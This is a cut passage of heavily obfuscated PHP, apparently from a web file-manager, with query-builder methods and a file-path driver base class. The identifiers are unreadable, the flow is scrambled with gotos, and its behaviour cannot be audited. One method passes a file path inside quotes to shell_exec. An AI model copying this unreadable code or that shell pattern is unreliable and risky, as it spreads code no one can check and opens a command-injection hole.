$FÔÏÆˆ„; } return !1; } public function data($Bƒ˜°Ê‘Õ = '') { $BğÚØÕ«èÎ =& $_SERVER[…Ò×–]; if ($BğÚØÕ«èÎ[33] === $Bƒ˜°Ê‘Õ && !empty($this->data)) { return $this->data; } if (is_object($Bƒ˜°Ê‘Õ)) { $Bƒ˜°Ê‘Õ = get_object_vars($Bƒ˜°Ê‘Õ); } elseif (is_string($Bƒ˜°Ê‘Õ)) { parse_str($Bƒ˜°Ê‘Õ, $Bƒ˜°Ê‘Õ); } elseif (!is_array($Bƒ˜°Ê‘Õ)) { think_exception(think_lang($BğÚØÕ«èÎ[263])); } $this->data = $Bƒ˜°Ê‘Õ; return $this; } public function join($A¤ÌÆÏ‡) { $dÌÜ¢‰æÍ® =& $_SERVER[…Ò×–]; if (is_array($A¤ÌÆÏ‡)) { $this->options[$dÌÜ¢‰æÍ®[274]] = $A¤ÌÆÏ‡; } elseif (!empty($A¤ÌÆÏ‡)) { $this->options[$dÌÜ¢‰æÍ®[274]][] = $A¤ÌÆÏ‡; } return $this; } public function union($AÊª¯ëßŸ«, $CáóÎÈ³¥Ã = false) { goto dˆâšâŒŒƒ; Aò¼š¡öË: if (is_object($AÊª¯ëßŸ«)) { $AÊª¯ëßŸ« = get_object_vars($AÊª¯ëßŸ«); } if (is_string($AÊª¯ëßŸ«)) { $Eİø¨ôè” = $AÊª¯ëßŸ«; } elseif (is_array($AÊª¯ëßŸ«)) { if (isset($AÊª¯ëßŸ«[0])) { $this->options[$Eğ÷ùÓĞ¨î[339]] = array_merge($this->options[$Eğ÷ùÓĞ¨î[339]], $AÊª¯ëßŸ«); return $this; } else { $Eİø¨ôè” = $AÊª¯ëßŸ«; } } else { think_exception(think_lang($Eğ÷ùÓĞ¨î[263])); } $this->options[$Eğ÷ùÓĞ¨î[339]][] = $Eİø¨ôè”; goto c¿³Ã¯¾Ğ; c¿³Ã¯¾Ğ: return $this; goto CƒÇÀè¶¹; dˆâšâŒŒƒ: $Eğ÷ùÓĞ¨î =& $_SERVER[…Ò×–]; if (empty($AÊª¯ëßŸ«)) { return $this; } if ($CáóÎÈ³¥Ã) { $this->options[$Eğ÷ùÓĞ¨î[339]][$Eğ÷ùÓĞ¨î[340]] = !0; } goto Aò¼š¡öË; CƒÇÀè¶¹: } public function cache($fÓ‰¤³Š½‘ = true, $Dë®›ƒ½„Š = null, $eäîé¿¿¼¿ = '') { $Fš‰Ÿ‘¹Õğ =& $_SERVER[…Ò×–]; if (!1 !== $fÓ‰¤³Š½‘) { $this->options[$Fš‰Ÿ‘¹Õğ[341]] = array($Fš‰Ÿ‘¹Õğ[89] => $fÓ‰¤³Š½‘, $Fš‰Ÿ‘¹Õğ[331] => $Dë®›ƒ½„Š, $Fš‰Ÿ‘¹Õğ[29] => $eäîé¿¿¼¿); } return $this; } public function field($cŠ´“™¤Ë´, $CËøÆ£†Ê¶ = false) { $BŒ‡Úµ®¤  =& $_SERVER[…Ò×–]; if (!0 === $cŠ´“™¤Ë´) { $c‰Õ¥Ù»¾ = $this->getDbFields(); $cŠ´“™¤Ë´ = $c‰Õ¥Ù»¾ ? $c‰Õ¥Ù»¾ : $BŒ‡Úµ®¤ [180]; } elseif ($CËøÆ£†Ê¶) { if (is_string($cŠ´“™¤Ë´)) { $cŠ´“™¤Ë´ = explode($BŒ‡Úµ®¤ [47], $cŠ´“™¤Ë´); } $c‰Õ¥Ù»¾ = $this->getDbFields(); $cŠ´“™¤Ë´ = $c‰Õ¥Ù»¾ ? array_diff($c‰Õ¥Ù»¾, $cŠ´“™¤Ë´) : $cŠ´“™¤Ë´; } $this->options[$BŒ‡Úµ®¤ [265]] = $cŠ´“™¤Ë´; return $this; } public function scope($e»Ş†Áí°† = '', $f„×È÷Øò› = NULL) { $e¶Í¬¢èŞ =& $_SERVER[…Ò×–]; if ($e¶Í¬¢èŞ[33] === $e»Ş†Áí°†) { if (isset($this->_scope[$e¶Í¬¢èŞ[34]])) { $a“Ùš¾æ¨ = $this->_scope[$e¶Í¬¢èŞ[34]]; } else { return $this; } } elseif (is_string($e»Ş†Áí°†)) { $c‰˜ïÅ˜—¾ = explode($e¶Í¬¢èŞ[47], $e»Ş†Áí°†); $a“Ùš¾æ¨ = array(); foreach ($c‰˜ïÅ˜—¾ as $Aš–ï‡à ±) { if (!isset($this->_scope[$Aš–ï‡à ±])) { continue; } $a“Ùš¾æ¨ = array_merge($a“Ùš¾æ¨, $this->_scope[$Aš–ï‡à ±]); } if (!empty($f„×È÷Øò›) && is_array($f„×È÷Øò›)) { $a“Ùš¾æ¨ = array_merge($a“Ùš¾æ¨, $f„×È÷Øò›); } } elseif (is_array($e»Ş†Áí°†)) { $a“Ùš¾æ¨ = $e»Ş†Áí°†; } if (is_array($a“Ùš¾æ¨) && !empty($a“Ùš¾æ¨)) { $this->options = array_merge($this->options, array_change_key_case($a“Ùš¾æ¨)); } return $this; } public function where($BéÂìºÃÏƒ, $E›ãÓ–ô®Ò = null) { $A°¥£ôµË‘ =& $_SERVER[…Ò×–]; if (!is_null($E›ãÓ–ô®Ò) && is_string($BéÂìºÃÏƒ)) { if (!is_array($E›ãÓ–ô®Ò)) { $E›ãÓ–ô®Ò = func_get_args(); array_shift($E›ãÓ–ô®Ò); } $E›ãÓ–ô®Ò = array_map(array($this->db, $A°¥£ôµË‘[335]), $E›ãÓ–ô®Ò); $BéÂìºÃÏƒ = vsprintf($BéÂìºÃÏƒ, $E›ãÓ–ô®Ò); } elseif (is_object($BéÂìºÃÏƒ)) { $BéÂìºÃÏƒ = get_object_vars($BéÂìºÃÏƒ); } elseif (is_array($BéÂìºÃÏƒ)) { foreach ($BéÂìºÃÏƒ as $fï“¤àÃŸä => $E´œƒÆÛñË) { if ((is_numeric($fï“¤àÃŸä) || !$fï“¤àÃŸä) && is_string($E´œƒÆÛñË)) { think_trace($A°¥£ôµË‘[342], $A°¥£ôµË‘[33], $A°¥£ôµË‘[46]); die; } } } if (is_string($BéÂìºÃÏƒ) && $A°¥£ôµË‘[33] != $BéÂìºÃÏƒ) { $dÇŸîÌğ©Ğ = array(); $dÇŸîÌğ©Ğ[$A°¥£ôµË‘[343]] = $BéÂìºÃÏƒ; $BéÂìºÃÏƒ = $dÇŸîÌğ©Ğ; } if (isset($this->options[$A°¥£ôµË‘[267]])) { $this->options[$A°¥£ôµË‘[267]] = array_merge($this->options[$A°¥£ôµË‘[267]], $BéÂìºÃÏƒ); } else { $this->options[$A°¥£ôµË‘[267]] = $BéÂìºÃÏƒ; } return $this; } public function limit($eŞ©¤Ç°Ã·, $BëÉŠøæ—¢ = null) { $EÉè•×Œ =& $_SERVER[…Ò×–]; $this->options[$EÉè•×Œ[284]] = is_null($BëÉŠøæ—¢) ? $eŞ©¤Ç°Ã· : $eŞ©¤Ç°Ã· . $EÉè•×Œ[47] . $BëÉŠøæ—¢; return $this; } public function page($d°¯à·¸Çå, $C›Ç´èÄÆ‰ = null) { $B˜×ìÀ™Š =& $_SERVER[…Ò×–]; $this->options[$B˜×ìÀ™Š[344]] = is_null($C›Ç´èÄÆ‰) ? $d°¯à·¸Çå : $d°¯à·¸Çå . $B˜×ìÀ™Š[47] . $C›Ç´èÄÆ‰; return $this; } public function comment($e‰İ•Û„ë˜) { $this->options[$_SERVER[…Ò×–][345]] = $e‰İ•Û„ë˜; return $this; } public function setProperty($C¶©âÙÚŠŠ, $fò¬Şù—–¤) { if (property_exists($this, $C¶©âÙÚŠŠ)) { $this->{$C¶©âÙÚŠŠ} = $fò¬Şù—–¤; } return $this; } } goto BÎÇ¥ê‰£ª; aÉ™ä„ö: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $d½¨£ÕåÙ­ =& $_SERVER[…Ò×–]; $this->objectDriver = array($d½¨£ÕåÙ­[57], $d½¨£ÕåÙ­[58], $d½¨£ÕåÙ­[59], $d½¨£ÕåÙ­[60], $d½¨£ÕåÙ­[61], $d½¨£ÕåÙ­[62], $d½¨£ÕåÙ­[63], $d½¨£ÕåÙ­[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($b¬»¿¯’°Ù) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($b¬»¿¯’°Ù, $_SERVER[…Ò×–][8]); } return $b¬»¿¯’°Ù; } public function getPathName($bÛƒŒ» ñ) { return $bÛƒŒ» ñ; } public function iconvApp($bˆ¹íò Ô) { return $bˆ¹íò Ô; } public function iconvSystem($AÂ…±ˆƒ‰) { return $AÂ…±ˆƒ‰; } public function iconvTo($A¤´äëß­Ë, $E„ì×Ø…’, $B£Œ‚àØÍ) { goto BÓ„¿µğŠ®; BÓ„¿µğŠ®: $f‰§…Ü¿¶« =& $_SERVER[…Ò×–]; if (!$A¤´äëß­Ë || !function_exists($f‰§…Ü¿¶«[65])) { return $A¤´äëß­Ë; } static $EÈã¸£å  = array(); goto d¦£Ù¶Ûì; B¬óíƒ³±: $EÈã¸£å [$B£Œ‚àØÍ . $f‰§…Ü¿¶«[66] . $E„ì×Ø…’ . $f‰§…Ü¿¶«[67] . $A¤´äëß­Ë] = $A¤´äëß­Ë; $EÈã¸£å [$B£Œ‚àØÍ . $f‰§…Ü¿¶«[66] . $E„ì×Ø…’ . $f‰§…Ü¿¶«[67] . $bòØÎêÌ] = $A¤´äëß­Ë; $EÈã¸£å [$E„ì×Ø…’ . $f‰§…Ü¿¶«[66] . $B£Œ‚àØÍ . $f‰§…Ü¿¶«[67] . $bòØÎêÌ] = $bòØÎêÌ; goto C•ò’¬ßå«; d¦£Ù¶Ûì: $C†ÉÀîÎçã = $E„ì×Ø…’ . $f‰§…Ü¿¶«[66] . $B£Œ‚àØÍ . $f‰§…Ü¿¶«[67] . $A¤´äëß­Ë; if (isset($EÈã¸£å [$C†ÉÀîÎçã])) { return $EÈã¸£å [$C†ÉÀîÎçã]; } if (function_exists($f‰§…Ü¿¶«[68])) { $bòØÎêÌ = @mb_convert_encoding($A¤´äëß­Ë, $B£Œ‚àØÍ, $E„ì×Ø…’); } else { $bòØÎêÌ = @iconv($E„ì×Ø…’, $B£Œ‚àØÍ, $A¤´äëß­Ë); } goto D ‘ì–»; D ‘ì–»: $bòØÎêÌ = $bòØÎêÌ ? $bòØÎêÌ : $A¤´äëß­Ë; if (strstr($bòØÎêÌ, $f‰§…Ü¿¶«[69])) { $bòØÎêÌ = str_replace($f‰§…Ü¿¶«[69], $f‰§…Ü¿¶«[70], $bòØÎêÌ); } $EÈã¸£å [$E„ì×Ø…’ . $f‰§…Ü¿¶«[66] . $B£Œ‚àØÍ . $f‰§…Ü¿¶«[67] . $A¤´äëß­Ë] = $bòØÎêÌ; goto B¬óíƒ³±; C•ò’¬ßå«: return $bòØÎêÌ; goto BáªáÉšØ™; BáªáÉšØ™: } public function getPathInner($C¦ñ´Ì‡ƒ˜) { $AÁĞÄÔƒà = IO::init($C¦ñ´Ì‡ƒ˜); return $AÁĞÄÔƒà->path; } public function getPathOuter($bãƒ›Õï¿ï) { $DÙÙğ¿¾•š =& $_SERVER[…Ò×–]; $bäªíˆŒŒ = strlen(trim($this->pathBase, $DÙÙğ¿¾•š[8])); $bãƒ›Õï¿ï = substr(trim($bãƒ›Õï¿ï, $DÙÙğ¿¾•š[8]), $bäªíˆŒŒ); return $this->pathDriver . $DÙÙğ¿¾•š[8] . ltrim($bãƒ›Õï¿ï, $DÙÙğ¿¾•š[8]); } public function isParentOf($AñÉÛ×îÁ¼, $Dßä‘ÊÂë´) { $c”¥…õâ‡ä =& $_SERVER[…Ò×–]; $AñÉÛ×îÁ¼ = rtrim(strtolower($AñÉÛ×îÁ¼), $c”¥…õâ‡ä[8]) . $c”¥…õâ‡ä[8]; $Dßä‘ÊÂë´ = rtrim(strtolower($Dßä‘ÊÂë´), $c”¥…õâ‡ä[8]) . $c”¥…õâ‡ä[8]; $FŠÃ¼˜òæ = strpos($Dßä‘ÊÂë´, $AñÉÛ×îÁ¼) === 0; return $FŠÃ¼˜òæ; } public function getType() { $FƒÍŠ®ã‹… =& $_SERVER[…Ò×–]; $A“‡ĞØÊáÌ = str_replace($FƒÍŠ®ã‹…[71], $FƒÍŠ®ã‹…[33], get_class($this)); return strtolower($A“‡ĞØÊáÌ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($DˆÛİ£â®Å, $eÀ×Ùƒ¡Ÿ) { $c«ŒŒÏ¸ù =& $_SERVER[…Ò×–]; $EËŸÕÒŞ± = rtrim($DˆÛİ£â®Å, $c«ŒŒÏ¸ù[8]) . $c«ŒŒÏ¸ù[8] . $eÀ×Ùƒ¡Ÿ; $AßÅï‡«¬” = $this->exist($EËŸÕÒŞ±); return $AßÅï‡«¬” ? $EËŸÕÒŞ± : !1; } public function setModifyTime($e¡»­É«‘, $EÉ†ŒìªÉ³ = '') { } public function renameObject($fƒÌŠì®Ïõ, $CÅ‚†œ¾—·) { goto DŠòòˆ…¹ß; fºŸ¤»ÂÜè: return $F¾­ÌŞˆ‹Œ ? $CÅ‚†œ¾—· : !1; goto c•¶™¼ñ²‘; DŠòòˆ…¹ß: $DêÁî¬¢Ã =& $_SERVER[…Ò×–]; $E—’ñ‘õƒñ = $CÅ‚†œ¾—·; Hook::trigger($DêÁî¬¢Ã[72], $this, $fƒÌŠì®Ïõ, $this, $this->pathFather($fƒÌŠì®Ïõ) . $CÅ‚†œ¾—·); goto d­¯ÏÚˆİ; d­¯ÏÚˆİ: $fƒÌŠì®Ïõ = $this->getPathOuter($fƒÌŠì®Ïõ); $CÅ‚†œ¾—· = $this->pathFather($fƒÌŠì®Ïõ) . $CÅ‚†œ¾—·; if (IO::isFile($fƒÌŠì®Ïõ)) { $F¾­ÌŞˆ‹Œ = IO::copy($fƒÌŠì®Ïõ, $this->pathFather($fƒÌŠì®Ïõ), REPEAT_RENAME_FOLDER, $E—’ñ‘õƒñ); if ($F¾­ÌŞˆ‹Œ) { IO::remove($fƒÌŠì®Ïõ); } } else { $F¾­ÌŞˆ‹Œ = IO::mkdir($CÅ‚†œ¾—·); if (!$F¾­ÌŞˆ‹Œ) { return !1; } $C‚Úğìö«‡ = IO::listPath($fƒÌŠì®Ïõ, !0); $EÂÌâÖ¯Ó = array_merge($C‚Úğìö«‡[$DêÁî¬¢Ã[73]], $C‚Úğìö«‡[$DêÁî¬¢Ã[74]]); foreach ($EÂÌâÖ¯Ó as $a¾‰Æ”Ğ«³) { IO::move($a¾‰Æ”Ğ«³[$DêÁî¬¢Ã[75]], $CÅ‚†œ¾—·, REPEAT_RENAME_FOLDER); } IO::remove($fƒÌŠì®Ïõ); } goto fºŸ¤»ÂÜè; c•¶™¼ñ²‘: } public function tempFile($fÃñÍ¦ìâí = '', $C—§•«• = '') { goto a«êŠŒ«¨±; Cæëá¤àÒ’: return $f¶‡Îµ•; goto aç²Ì°±’; a«êŠŒ«¨±: if (!$fÃñÍ¦ìâí) { $fÃñÍ¦ìâí = rand_string(15); } $BÑ¹»¦ÅÓŒ = TEMP_FILES . rand_string(15) . $_SERVER[…Ò×–][8]; @mkdir($BÑ¹»¦ÅÓŒ, 511, !0); goto DÅ«©¼çéÒ; DÅ«©¼çéÒ: $f¶‡Îµ• = $BÑ¹»¦ÅÓŒ . $fÃñÍ¦ìâí; @touch($f¶‡Îµ•); if ($C—§•«•) { file_put_contents($f¶‡Îµ•, $C—§•«•); } goto Cæëá¤àÒ’; aç²Ì°±’: } public function tempFileRemve($d®ÏéˆÕŠó) { @unlink($d®ÏéˆÕŠó); @rmdir($this->pathFather($d®ÏéˆÕŠó)); } public function mkfile($eÕ—¾õ²Îˆ, $c¢÷øÒç˜ = '', $a£…ùº¹ = REPEAT_RENAME) { } public function mkdir($Fìø®¤îîº, $eŸ¤‚ÑÙ¬„ = REPEAT_SKIP) { } public function delFile($DÜëÍ‘â¸Õ) { } public function delFolder($Eæëø±ë†°) { } public function copyFile($C‘å½õ»”ä, $a¾Š›œœ“ç) { } public function moveFile($fªÛ‘…À®«, $bõ–¿Á¾øÀ) { } public function remove($Fç­Í¹¨») { if ($this->isFile($Fç­Í¹¨»)) { return $this->delFile($Fç­Í¹¨»); } return $this->delFolder($Fç­Í¹¨»); } public function rename($dïĞ÷‹…¬, $CÁ©Œ¡²ë©) { } public function exist($D¹˜Ö²–) { } public function findByHash($DÙ§å½òÓâ = '', $Bİ˜à’«‘ = '') { return !1; } public function isFile($E™‡…Ò) { } public function isFolder($A¹ø×Íù±‰) { } public function size($c¿ÁÒ†ÁÍî) { } public function info($dœä­”¾) { } public function infoSimple($d˜ƒöœâ¹é) { return $this->info($d˜ƒöœâ¹é); } public function infoAuth($d¡”“™‰¥) { return $this->info($d¡”“™‰¥); } public function infoFull($B¤²®»ŞÒÙ) { return $this->info($B¤²®»ŞÒÙ); } public function infoWithChildren($d¡ƒ‰°Ìá) { $FÙ­¼ÜŒÎÃ =& $_SERVER[…Ò×–]; static $DïçÑ±¥¿‚ = array(); if (isset($DïçÑ±¥¿‚[$d¡ƒ‰°Ìá])) { return $DïçÑ±¥¿‚[$d¡ƒ‰°Ìá]; } $b¾Ô»»åŸ = $this->info($d¡ƒ‰°Ìá); if ($b¾Ô»»åŸ && $b¾Ô»»åŸ[$FÙ­¼ÜŒÎÃ[29]] == $FÙ­¼ÜŒÎÃ[76]) { $AˆŞ°Ø†ª = array($FÙ­¼ÜŒÎÃ[77] => 0, $FÙ­¼ÜŒÎÃ[78] => 0, $FÙ­¼ÜŒÎÃ[79] => 0); $this->infoChildren($d¡ƒ‰°Ìá, $AˆŞ°Ø†ª); $b¾Ô»»åŸ[$FÙ­¼ÜŒÎÃ[77]] = $AˆŞ°Ø†ª[$FÙ­¼ÜŒÎÃ[77]]; $b¾Ô»»åŸ[$FÙ­¼ÜŒÎÃ[80]] = array($FÙ­¼ÜŒÎÃ[81] => $AˆŞ°Ø†ª[$FÙ­¼ÜŒÎÃ[78]], $FÙ­¼ÜŒÎÃ[82] => $AˆŞ°Ø†ª[$FÙ­¼ÜŒÎÃ[79]]); $DïçÑ±¥¿‚[$d¡ƒ‰°Ìá] = $b¾Ô»»åŸ; } return $b¾Ô»»åŸ; } public function listPath($BµèÄ ğ×ì, $AÎï¨Æï¾‘ = false) { } public function has($bè–î´ÚÂ, $DˆĞ˜Ğò¡ = false, $FÁ‡¯£Ò˜ = false) { } public function canRead($eÎÄôÖ·–‰) { } public function canWrite($E«¥©ÌŒƒ×) { } public function getContent($e—ã˜“½Ü¼) { } public function setContent($c¸Îª±…’ô, $d©÷¤öó™ã = '') { } protected function infoChildren($bé•º÷, &$B©ÒŞ¥¨) { $få­×¼‹˜ =& $_SERVER[…Ò×–]; check_abort(); $BĞ½õè¼ØÄ = $this->listPath($bé•º÷, !0); $BĞ½õè¼ØÄ = array_merge($BĞ½õè¼ØÄ[$få­×¼‹˜[74]], $BĞ½õè¼ØÄ[$få­×¼‹˜[73]]); foreach ($BĞ½õè¼ØÄ as $bä¢ØŞÉÑĞ) { if ($bä¢ØŞÉÑĞ[$få­×¼‹˜[29]] == $få­×¼‹˜[76]) { $B©ÒŞ¥¨[$få­×¼‹˜[79]]++; $B£Ô‰æ«† = $this->getPathInner($bä¢ØŞÉÑĞ[$få­×¼‹˜[75]]); $this->infoChildren($B£Ô‰æ«†, $B©ÒŞ¥¨); } else { $B©ÒŞ¥¨[$få­×¼‹˜[78]]++; $B©ÒŞ¥¨[$få­×¼‹˜[77]] += $bä¢ØŞÉÑĞ[$få­×¼‹˜[77]]; } } } public function fileSubstr($B¼¶‹Ï½êÂ, $FŞÑØƒˆ¼Ö, $D”Ê”ÅË) { } public function listAll($A‹¼¢Â†²) { } public function upload($BÆ¥òìÀ’, $dô ÙáĞã–, $AŠïŒ‚¡í = false, $DµøÏ†ùù™ = REPEAT_REPLACE) { } public function uploadFileByID($b¨Ê§Ò“È™, $DÖ–ĞÊÜÙ¡, $f°ôµé—¾Á) { } public function uploadFileByPath($bô³Á„Ù‘Î, $bì‹ùÀÕÇÍ, $f ŸÏ‚†×– = array()) { } public function isUploadServer() { $a–à£ğÏ¨© =& $_SERVER[…Ò×–]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $a–à£ğÏ¨©[83]) { return !0; } return $GLOBALS[$a–à£ğÏ¨©[6]][$a–à£ğÏ¨©[84]][$a–à£ğÏ¨©[85]]; } public function isFileOutServer() { $aÓî‚ØÅŠô =& $_SERVER[…Ò×–]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $aÓî‚ØÅŠô[83]) { return !0; } return $GLOBALS[$aÓî‚ØÅŠô[6]][$aÓî‚ØÅŠô[84]][$aÓî‚ØÅŠô[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($B…Á·Ÿ«º) { $cÅ¥İŠ»ÂŒ =& $_SERVER[…Ò×–]; if (!$this->isCdnHost()) { return $B…Á·Ÿ«º; } return str_replace(trim(get_url_root($B…Á·Ÿ«º), $cÅ¥İŠ»ÂŒ[8]), trim($this->cdnHost, $cÅ¥İŠ»ÂŒ[8]), $B…Á·Ÿ«º); } public function uploadLink($DŒÌ¸‚ğ, $dö‰°©ù½ø = 0) { goto b÷«šÎ°¹¾; Dç¢¸İ©™„: if (!in_array($d‰Ú«àÍ¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $cëëæ¦ª‘ = 1024 * 1024 * 10; goto dÓîî…‘í˜; dÓîî…‘í˜: $Béñ½×Â…š = $dö‰°©ù½ø <= $cëëæ¦ª‘ ? $D¿´ÀŞí…ˆ[87] : $D¿´ÀŞí…ˆ[88]; $eœ¾ï¼Ÿê– = (!$dö‰°©ù½ø ? 1 : ceil($dö‰°©ù½ø / pow(1024, 3))) * 3600 * 4; $AÔ¬Ø¥Ø¸ù = $this->{$Béñ½×Â…š}($DŒÌ¸‚ğ, $eœ¾ï¼Ÿê–); goto B©ï¦áŞƒ; B©ï¦áŞƒ: if ($AÔ¬Ø¥Ø¸ù) { $AÔ¬Ø¥Ø¸ù[$D¿´ÀŞí…ˆ[89]] = $DŒÌ¸‚ğ; $AÔ¬Ø¥Ø¸ù[$D¿´ÀŞí…ˆ[90]] = $d‰Ú«àÍ¤; } return $AÔ¬Ø¥Ø¸ù; goto AçùàÈù†; b÷«šÎ°¹¾: $D¿´ÀŞí…ˆ =& $_SERVER[…Ò×–]; if ($this->isUploadServer()) { return; } $d‰Ú«àÍ¤ = $this->getType(); goto Dç¢¸İ©™„; AçùàÈù†: } public function uploadFormData($aëœ‹¬ÖÕ, $cÏ’Åó™œï = 3600) { } public function multiUploadFormData($Dì›¼Ú¾Ÿ, $A™³á¦ãã¿ = 3600) { } public function download($CÙÚ•óê˜ä, $d‰Ãø¯å‹Ñ) { } public function ext($cõÃÊ‡´—) { $eÎ„Ä×‚âÅ =& $_SERVER[…Ò×–]; if (strpos($cõÃÊ‡´—, $eÎ„Ä×‚âÅ[8]) === -1) { $aí•„Ø†ß = $cõÃÊ‡´—; } else { $aí•„Ø†ß = $this->pathThis($cõÃÊ‡´—); } $D¸’¨‹ˆÍ = $eÎ„Ä×‚âÅ[33]; if (strstr($aí•„Ø†ß, $eÎ„Ä×‚âÅ[91])) { $D¸’¨‹ˆÍ = substr($aí•„Ø†ß, strrpos($aí•„Ø†ß, $eÎ„Ä×‚âÅ[91]) + 1); $D¸’¨‹ˆÍ = strtolower($D¸’¨‹ˆÍ); } if (strlen($D¸’¨‹ˆÍ) > 3 && preg_match($eÎ„Ä×‚âÅ[92], $D¸’¨‹ˆÍ, $c´‚ƒÀ‘Ñ)) { $D¸’¨‹ˆÍ = $eÎ„Ä×‚âÅ[33]; } return $D¸’¨‹ˆÍ; } public function pathThis($A•ÏƒÏÜï…) { $bÓ¥ò®¤Ö =& $_SERVER[…Ò×–]; $A•ÏƒÏÜï… = str_replace($bÓ¥ò®¤Ö[93], $bÓ¥ò®¤Ö[8], rtrim($A•ÏƒÏÜï…, $bÓ¥ò®¤Ö[8])); $Dôğ …æà† = strrpos($A•ÏƒÏÜï…, $bÓ¥ò®¤Ö[8]); if ($Dôğ …æà† === !1) { return $A•ÏƒÏÜï…; } return substr($A•ÏƒÏÜï…, $Dôğ …æà† + 1); } public function pathFather($FØëµÆ³ ) { $aˆ‹ĞªÙÃ =& $_SERVER[…Ò×–]; $FØëµÆ³  = str_replace($aˆ‹ĞªÙÃ[93], $aˆ‹ĞªÙÃ[8], rtrim($FØëµÆ³ , $aˆ‹ĞªÙÃ[8])); $f‘íÄ¦µ÷ = strrpos($FØëµÆ³ , $aˆ‹ĞªÙÃ[8]); if ($f‘íÄ¦µ÷ === !1) { return $aˆ‹ĞªÙÃ[33]; } return substr($FØëµÆ³ , 0, $f‘íÄ¦µ÷ + 1); } public function hashSimple($E¸ÄÊáã‹‘) { goto aÌí†äˆ; c‡—‡÷£ìÏ: $E¸ËÛµÚèæ = intval($dùµ»Àø§ / $DÔ¦ÎŒšÆ®); $aç¾¯âÆß± = $BÑè‰´‡ó´[33]; for ($eÁ çÆ¡‚ê = 0; $eÁ çÆ¡‚ê < $DÔ¦ÎŒšÆ®; $eÁ çÆ¡‚ê++) { $aç¾¯âÆß± .= $this->fileSubstr($E¸ÄÊáã‹‘, $E¸ËÛµÚèæ * $eÁ çÆ¡‚ê, $DğŒß¯Â‰ò); } goto dä³©´»Ä; BÀ–Ú¨éÃ: $DğŒß¯Â‰ò = 200; $DÔ¦ÎŒšÆ® = 50; if ($dùµ»Àø§ <= $DğŒß¯Â‰ò * $DÔ¦ÎŒšÆ®) { return $this->hashMd5($E¸ÄÊáã‹‘) . $dùµ»Àø§; } goto c‡—‡÷£ìÏ; dä³©´»Ä: $aç¾¯âÆß± .= $this->fileSubstr($E¸ÄÊáã‹‘, $dùµ»Àø§ - $DğŒß¯Â‰ò, $DğŒß¯Â‰ò); return md5($aç¾¯âÆß±) . $dùµ»Àø§; goto bÇÎíÂãó; aÌí†äˆ: $BÑè‰´‡ó´ =& $_SERVER[…Ò×–]; if (!$E¸ÄÊáã‹‘) { return md5($BÑè‰´‡ó´[33]); } $dùµ»Àø§ = $this->size($E¸ÄÊáã‹‘); goto BÀ–Ú¨éÃ; bÇÎíÂãó: } public static $md5Cache = array(); public function hashMd5($D…‚¿†¡º) { $D…‚¿†¡º = $this->iconvSystem($D…‚¿†¡º); if (isset(self::$md5Cache[$D…‚¿†¡º])) { return self::$md5Cache[$D…‚¿†¡º]; } self::$md5Cache[$D…‚¿†¡º] = $this->hashMd5Shell($D…‚¿†¡º); if (!self::$md5Cache[$D…‚¿†¡º]) { self::$md5Cache[$D…‚¿†¡º] = @md5_file($D…‚¿†¡º); } return self::$md5Cache[$D…‚¿†¡º]; } private function hashMd5Shell($c¿†ÂÌÇ²®) { goto b²óŒÖŠ˜„; dÃäóÇÇ…©: $bÅ²İ·‰ƒ = Cache::get($eĞ‹‹â×¢Ö[97]); if (!$bÅ²İ·‰ƒ) { $BÚÒ‘Á‡êŠ = BASIC_PATH . $eĞ‹‹â×¢Ö[98]; $aÍ°óÙÄ “ = md5_file($BÚÒ‘Á‡êŠ); $bÅ²İ·‰ƒ = $eĞ‹‹â×¢Ö[99]; foreach ($DÁÆÁä¢œ© as $bŠõƒ‚ê³) { $cë¶åêÂ„Æ = shell_exec($bŠõƒ‚ê³ . "\x20\42{$BÚÒ‘Á‡êŠ}\42"); if ($cë¶åêÂ„Æ && substr(trim($cë¶åêÂ„Æ), 0, 32) == $aÍ°óÙÄ “) { $bÅ²İ·‰ƒ = $bŠõƒ‚ê³; break; } } Cache::set($eĞ‹‹â×¢Ö[97], $bÅ²İ·‰ƒ, 3600); } if ($bÅ²İ·‰ƒ == $eĞ‹‹â×¢Ö[99]) { return !1; } goto FÙÖÄ¾ƒ…Ü; b²óŒÖŠ˜„: $eĞ‹‹â×¢Ö =& $_SERVER[…Ò×–]; if (!function_exists($eĞ‹‹â×¢Ö[94])) { return !1; } $DÁÆÁä¢œ© = array($eĞ‹‹â×¢Ö[95], $eĞ‹‹â×¢Ö[96]); goto dÃäóÇÇ…©; FÙÖÄ¾ƒ…Ü: $cë¶åêÂ„Æ = shell_exec($bÅ²İ·‰ƒ . "\40\x22{$c¿†ÂÌÇ²®}\x22"); $cë¶åêÂ„Æ = str_replace($eĞ‹‹â×¢Ö[100], $eĞ‹‹â×¢Ö[33], $cë¶åêÂ„Æ); return substr($cë¶åêÂ„Æ, 0, 32); goto f¢™¢Î‹ã; f¢™¢Î‹ã: } public function link($a«ƒğŠ»˜ô) { return $a«ƒğŠ»˜ô; } public function fileOut($aÑÙí¢‡àĞ, $FÙ¿©‹í¡Ù = false, $AÜ¡‘İ¸ò = false, $c©‰Şæİ¬ = '') { goto DßÄ…³Ã„; E»®¹Ÿ»è: $cËê×Ô¾Š  = $this->getType() == $a®µÉ¸˜å‚[102]; $e ­Ñ¤íÕ÷ = $GLOBALS[$a®µÉ¸˜å‚[6]][$a®µÉ¸˜å‚[84]][$a®µÉ¸˜å‚[103]][$a®µÉ¸˜å‚[104]]; $bÕ«ĞâÙ¯¼ = (double) $GLOBALS[$a®µÉ¸˜å‚[6]][$a®µÉ¸˜å‚[84]][$a®µÉ¸˜å‚[103]][$a®µÉ¸˜å‚[105]] * 1024 * 1024; goto Eõ²â÷”é’; DßÄ…³Ã„: $a®µÉ¸˜å‚ =& $_SERVER[…Ò×–]; $this->cacheMethod(null, null); if (!$aÑÙí¢‡àĞ || !$this->exist($aÑÙí¢‡àĞ)) { show_json(LNG($a®µÉ¸˜å‚[101]), !1, $AÜ¡‘İ¸ò); } goto E»®¹Ÿ»è; EáŠÚÆñä§: if 